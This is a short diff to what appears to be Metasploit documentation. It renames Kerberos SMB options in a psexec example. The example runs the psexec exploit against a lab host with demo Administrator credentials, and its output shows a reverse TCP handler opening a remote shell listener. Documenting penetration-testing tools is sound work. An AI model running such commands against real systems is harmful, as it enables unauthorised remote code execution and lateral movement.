@@ -194,7 +194,7 @@ Running psexec against a host:
 
 ```
 msf6 > use exploit/windows/smb/psexec
-msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smbauth=kerberos domaincontrollerrhost=192.168.123.13 smbrhostname=dc3.demo.local domain=demo.local
+msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
 
 [*] Started reverse TCP handler on 192.168.123.1:4444
 [*] 192.168.123.13:445 - Connecting to the server...
